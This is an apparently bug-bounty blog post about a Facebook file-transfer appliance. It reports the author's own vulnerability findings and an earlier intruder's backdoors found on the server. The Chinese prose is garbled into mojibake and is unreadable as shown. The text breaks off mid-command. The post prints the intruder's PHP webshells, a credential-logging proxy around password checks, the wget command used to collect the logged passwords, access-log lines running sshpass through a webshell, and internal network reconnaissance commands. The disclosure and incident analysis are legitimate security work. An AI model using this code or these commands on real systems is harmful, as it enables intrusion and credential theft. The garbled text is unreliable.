&lt;p&gt;FTA ç‚ºä¸€æ¬¾æ¨™æ¦œå®‰å…¨æª”æ¡ˆå‚³è¼¸çš„ç”¢å“ï¼Œå¯è®“ä½¿ç”¨è€…ç·šä¸Šåˆ†äº«ã€åŒæ­¥æª”æ¡ˆï¼Œä¸¦æ•´åˆ AD, LDAP, Kerberos ç­‰ Single Sign-on æ©Ÿåˆ¶ï¼ŒEnterprise ç‰ˆæœ¬æ›´æ”¯æ´ SSL VPN æœå‹™ã€‚&lt;/p&gt;

&lt;p&gt;é¦–å…ˆçœ‹åˆ° FTA çš„ç¬¬ä¸€ä»¶äº‹æ˜¯å»ç¶²è·¯ä¸Šæœå°‹æ˜¯å¦æœ‰å…¬é–‹çš„ Exploit å¯ä»¥åˆ©ç”¨ï¼ŒExploit æœ€è¿‘çš„æ˜¯ç”± HD Moore ç™¼ç¾ä¸¦ç™¼ä½ˆåœ¨ Rapid7 çš„é€™ç¯‡ Advisory&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857&quot;&gt;Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å¼±é»ä¸­å¯ç›´æ¥å¾ â€œ&lt;strong&gt;/tws/getStatus&lt;/strong&gt;â€ ä¸­æ´©æ¼çš„ç‰ˆæœ¬è³‡è¨Šåˆ¤æ–·æ˜¯å¦å¯åˆ©ç”¨ï¼Œåœ¨ç™¼ç¾ files.fb.com æ™‚ç‰ˆæœ¬å·²å¾æœ‰æ¼æ´çš„ 0.18 å‡ç´šè‡³ 0.20 äº†ï¼Œä¸éå°±å¾ Advisory ä¸­æ‰€é€éœ²çš„ç‰‡æ®µç¨‹å¼ç¢¼æ„Ÿè¦º FTA çš„æ’°å¯«é¢¨æ ¼å¦‚æœå†ç¹¼çºŒæŒ–æ˜å¯èƒ½é‚„æ˜¯æœƒæœ‰å•é¡Œå­˜åœ¨çš„ï¼Œæ‰€ä»¥é€™æ™‚çš„ç­–ç•¥ä¾¿é–‹å§‹å¾€å°‹æ‰¾ FTA ç”¢å“çš„ 0-Day å‰é€²!&lt;/p&gt;

&lt;p&gt;ä¸éå¾å¯¦éš›é»‘ç®±çš„æ–¹å¼å…¶å¯¦æ‰¾ä¸å‡ºä»€éº¼å•é¡Œé»åªå¥½æƒ³è¾¦æ³•å°‡æ–¹å‘è½‰ç‚ºç™½ç®±æ¸¬è©¦ï¼Œé€éå„ç¨®æ–¹å¼æ‹¿åˆ°èˆŠç‰ˆçš„ FTA åŸå§‹ç¢¼å¾Œçµ‚æ–¼å¯ä»¥é–‹å§‹ç ”ç©¶äº†!&lt;/p&gt;

&lt;p&gt;æ•´å€‹ FTA ç”¢å“å¤§è‡´æ¶æ§‹&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ç¶²é ç«¯ä»‹é¢ä¸»è¦ç”± Perl ä»¥åŠ PHP æ§‹æˆ&lt;/li&gt;
  &lt;li&gt;PHP åŸå§‹ç¢¼çš†ç¶“é IonCube åŠ å¯†&lt;/li&gt;
  &lt;li&gt;åœ¨èƒŒæ™¯è·‘äº†è¨±å¤š Perl çš„ Daemon&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;é¦–å…ˆæ˜¯è§£å¯† IonCude çš„éƒ¨åˆ†ï¼Œè¨±å¤šè¨­å‚™ç‚ºäº†é˜²æ­¢è‡ªå·±çš„ç”¢å“è¢«æª¢è¦–æ‰€ä»¥æœƒå°‡åŸå§‹ç¢¼åŠ å¯†ï¼Œä¸éå¥½åœ¨ FTA ä¸Šçš„ IonCude ç‰ˆæœ¬æ²’åˆ°æœ€æ–°ï¼Œå¯ä»¥ä½¿ç”¨ç¾æˆçš„å·¥å…·è§£å¯†ï¼Œä¸éç”±æ–¼ PHP ç‰ˆæœ¬çš„å•é¡Œï¼Œç´°ç¯€éƒ¨ä»½ä»¥åŠæ•¸å€¼é‹ç®—ç­‰å¯èƒ½è¦é è‡ªå·±ä¿®å¾©ä¸€ä¸‹ï¼Œä¸ç„¶æœ‰é»é›£çœ‹â€¦&lt;/p&gt;

&lt;p&gt;ç¶“éç°¡å–®çš„åŸå§‹ç¢¼å¯©æŸ¥å¾Œç™¼ç¾ï¼Œå¥½æ‰¾çš„å¼±é»æ‡‰è©²éƒ½è¢« Rapid7 æ‰¾èµ°äº† T^T  &lt;br /&gt;
è€Œéœ€è¦èªè­‰æ‰èƒ½è§¸ç™¼çš„æ¼æ´åˆä¸æ€éº¼å¥½ç”¨ï¼Œåªå¥½èªçœŸé»å¾€æ·±å±¤ä¸€é»çš„åœ°æ–¹æŒ–æ˜!&lt;/p&gt;

&lt;p&gt;ç¶“éå¹¾å¤©çš„èªçœŸæŒ–æ˜ï¼Œæœ€å¾Œç¸½å…±ç™¼ç¾äº†ä¸ƒå€‹å¼±é»ï¼Œå…¶ä¸­åŒ…å«äº†&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Cross-Site Scripting x 3&lt;/li&gt;
  &lt;li&gt;Pre-Auth SQL Injection leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Known-Secret-Key leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Local Privilege Escalation x 2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;é™¤äº†å›å ± Facebook å®‰å…¨åœ˜éšŠå¤–ï¼Œå…¶é¤˜çš„å¼±é»ä¹Ÿè£½ä½œæˆ Advisory æäº¤ Accellion æŠ€è¡“çª—å£ï¼Œç¶“éå» å•†ä¿®è£œæäº¤ CERT/CC å¾Œå–å¾—å››å€‹ CVE ç·¨è™Ÿ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2016-2350&lt;/li&gt;
  &lt;li&gt;CVE-2016-2351&lt;/li&gt;
  &lt;li&gt;CVE-2016-2352&lt;/li&gt;
  &lt;li&gt;CVE-2016-2353&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è©³ç´°çš„å¼±é»ç´°ç¯€æœƒå¾… Full Disclosure Policy å¾Œå…¬å¸ƒ!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/2.jpg&quot; alt=&quot;shell on facebook&quot; /&gt;&lt;br /&gt;
&lt;em&gt;â†‘ ä½¿ç”¨ Pre-Auth SQL Injection å¯«å…¥ Webshell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨å¯¦éš›æ»²é€ä¸­é€²å»ä¼ºæœå™¨å¾Œçš„ç¬¬ä¸€ä»¶äº‹æƒ…å°±æ˜¯æª¢è¦–ç•¶å‰çš„ç’°å¢ƒæ˜¯å¦å°è‡ªå·±å‹å–„ï¼Œç‚ºäº†è¦è®“è‡ªå·±å¯ä»¥åœ¨ä¼ºæœå™¨ä¸Šå¾…çš„ä¹…å°±è¦ç›¡å¯èƒ½çš„äº†è§£ä¼ºæœå™¨ä¸Šæœ‰ä½•é™åˆ¶ã€ç´€éŒ„ï¼Œé¿é–‹å¯èƒ½æœƒè¢«ç™¼ç¾çš„é¢¨éšª :P&lt;/p&gt;

&lt;p&gt;Facebook å¤§è‡´æœ‰ä»¥ä¸‹é™åˆ¶:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;é˜²ç«ç‰†ç„¡æ³•é€£å¤–, TCP, UDP, 53, 80, 443 çš†ç„¡æ³•&lt;/li&gt;
  &lt;li&gt;å­˜åœ¨é ç«¯çš„ Syslog ä¼ºæœå™¨&lt;/li&gt;
  &lt;li&gt;é–‹å•Ÿ Auditd è¨˜éŒ„&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ç„¡æ³•å¤–é€£çœ‹èµ·ä¾†æœ‰é»éº»ç…©ï¼Œä½†æ˜¯ ICMP Tunnel çœ‹ä¼¼æ˜¯å¯è¡Œçš„ï¼Œä½†é€™åªæ˜¯ä¸€å€‹ Bug Bounty Program å…¶å¯¦ä¸éœ€è¦å¤ªéº»ç…©å°±ç´”ç²¹ä»¥ Webshell æ“ä½œå³å¯ã€‚&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;ä¼¼ä¹æœ‰é»å¥‡æ€ª&quot;&gt;ä¼¼ä¹æœ‰é»å¥‡æ€ª?&lt;/h3&gt;

&lt;p&gt;æ­£ç•¶æ”¶é›†è­‰æ“šæº–å‚™å›å ± Facebook å®‰å…¨åœ˜éšŠæ™‚ï¼Œå¾ç¶²é æ—¥èªŒä¸­ä¼¼ä¹çœ‹åˆ°ä¸€äº›å¥‡æ€ªçš„ç—•è·¡ã€‚&lt;/p&gt;

&lt;p&gt;é¦–å…ˆæ˜¯åœ¨ â€œ&lt;strong&gt;/var/opt/apache/php_error_log&lt;/strong&gt;â€ ä¸­çœ‹åˆ°ä¸€äº›å¥‡æ€ªçš„ PHP éŒ¯èª¤è¨Šæ¯ï¼Œå¾éŒ¯èª¤è¨Šæ¯ä¾†çœ‹ä¼¼ä¹åƒæ˜¯é‚Šæ”¹ Code é‚ŠåŸ·è¡Œæ‰€ç”¢ç”Ÿçš„éŒ¯èª¤?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/3.jpg&quot; alt=&quot;PHP error log&quot; /&gt;&lt;br /&gt;
&lt;em&gt;â†‘ PHP error log&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
è·Ÿéš¨éŒ¯èª¤è¨Šæ¯çš„è·¯å¾‘å»çœ‹ç™¼ç¾ç–‘ä¼¼å‰äººç•™ä¸‹çš„ Webshell å¾Œé–€&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/4.jpg&quot; alt=&quot;Webshell on facebook server&quot; /&gt;&lt;br /&gt;
&lt;em&gt;â†‘ Webshell on facebook server&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;å…¶ä¸­å¹¾å€‹æª”æ¡ˆçš„å…§å®¹å¦‚ä¸‹&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;sshpass&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;æ²’éŒ¯ï¼Œå°±æ˜¯é‚£å€‹ &lt;a href=&quot;http://linux.die.net/man/1/sshpass&quot;&gt;sshpass&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;div class=&quot;highlight-name&quot;&gt;bN3d10Aw.php&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;highlight-name&quot;&gt;uploader.php&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;f][&amp;quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tmp_name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;], basename(&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$_FILES[&amp;quot;f&amp;quot;]&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[&amp;quot;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;])); ?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;highlight-name&quot;&gt;d.php&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;include_oncce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/home/seos/courier/remote.inc&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;c&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;highlight-name&quot;&gt;sclient\_user\_class\_standard.inc&lt;/div&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;include_once&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;sclient_user_class_standard.inc.orig&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/home/seos/courier/B3dKe9sQaa0L.log&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
&lt;span class=&quot;nv&quot;&gt;$retries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$max_retries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;// çœç•¥...&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Y-m-d H:i:s T&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;REMOTE_ADDR&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;HTTP_USER_AGENT&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;POST=&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;GET=&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;;COOKIE=&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;// çœç•¥...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;å‰å¹¾å€‹å°±æ˜¯å¾ˆæ¨™æº–çš„ PHP ä¸€å¥è©±æœ¨é¦¬  &lt;br /&gt;
å…¶ä¸­æ¯”è¼ƒç‰¹åˆ¥çš„æ˜¯ â€œ&lt;strong&gt;sclient_user_class_standard.inc&lt;/strong&gt;â€ é€™å€‹æª”æ¡ˆ&lt;/p&gt;

&lt;p&gt;include_once ä¸­ â€œ&lt;strong&gt;sclient_user_class_standard.inc.orig&lt;/strong&gt;â€ ç‚ºåŸæœ¬å°å¯†ç¢¼é€²è¡Œé©—è­‰çš„ PHP ç¨‹å¼ï¼Œé§­å®¢åšäº†ä¸€å€‹ Proxy åœ¨ä¸­é–“ä¸¦åœ¨é€²è¡Œä¸€äº›é‡è¦æ“ä½œæ™‚å…ˆæŠŠ GET, POST, COOKIE çš„å€¼è¨˜éŒ„èµ·ä¾†&lt;/p&gt;

&lt;p&gt;æ•´ç†ä¸€ä¸‹ï¼Œé§­å®¢åšäº†ä¸€å€‹ Proxy åœ¨å¯†ç¢¼é©—è­‰çš„åœ°æ–¹ï¼Œä¸¦ä¸”è¨˜éŒ„ Facebook å“¡å·¥çš„å¸³è™Ÿå¯†ç¢¼ï¼Œä¸¦ä¸”å°‡è¨˜éŒ„åˆ°çš„å¯†ç¢¼æ”¾ç½®åœ¨ Web ç›®éŒ„ä¸‹ï¼Œé§­å®¢æ¯éš”ä¸€æ®µæ™‚é–“ä½¿ç”¨   wget æŠ“å–&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://files.fb.com/courier/B3dKe9sQaa0L.log
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/5.jpg&quot; alt=&quot;logged password&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
&lt;em&gt;â†‘ Logged passwords&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;å¾ç´€éŒ„è£¡é¢å¯ä»¥çœ‹åˆ°é™¤äº†ä½¿ç”¨è€…å¸³è™Ÿå¯†ç¢¼å¤–ï¼Œé‚„æœ‰å¾ FTA è¦æ±‚æª”æ¡ˆæ™‚çš„ä¿¡ä»¶å…§å®¹ï¼Œè¨˜éŒ„åˆ°çš„å¸³è™Ÿå¯†ç¢¼æœƒå®šæ™‚ Rotate (å¾Œæ–‡æœƒæåŠï¼Œé€™é»é‚„æ»¿æ©Ÿè»Šçš„XD)&lt;/p&gt;

&lt;p&gt;ç™¼ç¾ç•¶ä¸‹ï¼Œæœ€è¿‘ä¸€æ¬¡çš„ Rotate å¾ 2/1 è¨˜éŒ„åˆ° 2/7 å…±ç´„ 300 ç­†å¸³è™Ÿå¯†ç¢¼ç´€éŒ„ï¼Œå¤§å¤šéƒ½æ˜¯ â€œ&lt;strong&gt;@fb.com&lt;/strong&gt;â€ æˆ–æ˜¯ â€œ&lt;strong&gt;@facebook.com&lt;/strong&gt;â€ çš„å“¡å·¥å¸³å¯†ï¼Œçœ‹åˆ°ç•¶ä¸‹è¦ºå¾—äº‹æƒ…æœ‰é»åš´é‡äº†ï¼Œåœ¨ FTA ä¸­ï¼Œä½¿ç”¨è€…çš„ç™»å…¥ä¸»è¦æœ‰å…©ç¨®æ¨¡å¼&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ä¸€èˆ¬ç”¨æˆ¶è¨»å†Šï¼Œå¯†ç¢¼ Hash å­˜åœ¨è³‡æ–™åº«ï¼Œç”± SHA256 + SALT å„²å­˜&lt;/li&gt;
  &lt;li&gt;Facebook å“¡å·¥ (@fb.com) å‰‡èµ°çµ±ä¸€èªè­‰ï¼Œä½¿ç”¨ LDAP ç”± AD èªè­‰&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;åœ¨é€™è£¡ç›¸ä¿¡è¨˜éŒ„åˆ°çš„æ˜¯çœŸå¯¦çš„å“¡å·¥å¸³è™Ÿå¯†ç¢¼ï¼Œ&lt;strong&gt;**çŒœæ¸¬&lt;/strong&gt;** é€™ä»½å¸³è™Ÿå¯†ç¢¼æ‡‰è©²å¯ä»¥é€šè¡Œ Facebook Mail OWA, VPN ç­‰æœå‹™åšæ›´é€²ä¸€æ­¥çš„æ»²é€â€¦&lt;/p&gt;

&lt;p&gt;æ­¤å¤–ï¼Œé€™å â€œé§­å®¢â€ å¯èƒ½ç¿’æ…£ä¸å¤ªå¥½ :P&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;å¾Œé–€åƒæ•¸çš†ä½¿ç”¨ GET ä¾†å‚³éï¼Œåœ¨ç¶²é æ—¥èªŒå¯ä»¥å¾ˆæ˜é¡¯çš„ç™¼ç¾ä»–çš„è¶³è·¡&lt;/li&gt;
  &lt;li&gt;é§­å®¢åœ¨é€²è¡Œä¸€äº›æŒ‡ä»¤æ“ä½œæ™‚æ²’é¡§æ…®åˆ° STDERR ï¼Œå°è‡´ç¶²é æ—¥èªŒä¸­å¾ˆå¤šæŒ‡ä»¤çš„éŒ¯èª¤è¨Šæ¯ï¼Œå¾ä¸­å¯ä»¥è§€å¯Ÿé§­å®¢åšäº†å“ªäº›æ“ä½œ&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
å¾ access.log å¯ä»¥è§€å¯Ÿåˆ°çš„æ¯éš”æ•¸æ—¥é§­å®¢æœƒå°‡è¨˜éŒ„åˆ°çš„å¸³è™Ÿå¯†ç¢¼æ¸…ç©º&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-prolog&quot; data-lang=&quot;prolog&quot;&gt;&lt;span class=&quot;mf&quot;&gt;192.168.54.13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;17955&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Sat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Jan&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2016&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;s-Atom&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;s-Atom&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0000&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1453575850&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;GET /courier/custom_template/1000/bN3dl0Aw.php?c=./sshpass -p &amp;#39;********&amp;#39; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &amp;#39;cp /home/seos/courier/B3dKe9sQaa0L.log /home/seos/courier/B3dKe9sQaa0L.log.2; echo &amp;gt; /home/seos/courier/B3dKe9sQaa0L.log&amp;#39; 2&amp;gt;/dev/stdout HTTP/1.1&amp;quot;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2559&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;æ‰“åŒ…æª”æ¡ˆ&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cat tmp_list3_2 &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;line&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; cp /home/filex2/1000/&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; files&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; 2&amp;gt;/dev/stdout
tar -czvf files.tar.gz files&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;å°å…§éƒ¨ç¶²è·¯çµæ§‹é€²è¡Œæ¢æ¸¬&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-tex&quot; data-lang=&quot;tex&quot;&gt;dig a archibus.thefacebook.com
telnet archibus.facebook.com 80
curl http://archibus.thefacebook.com/spaceview&lt;span class=&quot;nb&quot;&gt;_&lt;/span&gt;facebook/locator/room.php
dig a records.fb.com
telnet records.fb.com 80
telnet records.fb.com 443
wget -O- -q http://192.168.41.16
dig a acme.facebook.com
./sshpass -p &amp;#39;********&amp;#39; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &amp;#39;for i in &lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;201&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;; do for j in 